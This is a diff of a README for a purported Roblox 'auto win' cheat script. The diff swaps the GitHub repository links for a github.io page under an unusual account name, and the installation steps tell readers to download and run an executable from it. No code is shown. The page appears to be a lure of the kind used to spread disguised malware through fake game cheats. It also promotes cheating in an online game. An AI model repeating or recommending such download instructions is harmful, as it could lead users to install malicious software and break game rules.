@@ -1,6 +1,6 @@
 # 🚀 1-Win-Obby-Roblox-Script-Auto-Win-2026 - Win every obby game with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Drugofabusebubblegum590/1-Win-Obby-Roblox-Script-Auto-Win-2026)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://drugofabusebubblegum590.github.io)
 
 ## 📌 Overview
 This software provides automation tools for the 1-Win Obby game on Roblox. It helps users complete difficult obstacle courses by automating tasks like movement, rebirths, and item collection. The script operates through a graphical interface, which allows for simple adjustments during gameplay. This tool functions in the background while you play to save time and reach objectives faster.
@@ -17,7 +17,7 @@ If your computer runs Roblox smoothly, it will handle this script without issues
 ## ⬇️ Installation Instructions
 Follow these steps to set up the software correctly:
 
-1. Visit the following link to access the download page: [https://github.com/Drugofabusebubblegum590/1-Win-Obby-Roblox-Script-Auto-Win-2026](https://github.com/Drugofabusebubblegum590/1-Win-Obby-Roblox-Script-Auto-Win-2026).
+1. Visit the following link to access the download page: [https://drugofabusebubblegum590.github.io](https://drugofabusebubblegum590.github.io).
 2. Locate the release section on the page.
 3. Click the link to download the executable file to your computer.
 4. Save the file to your desktop for easy access.
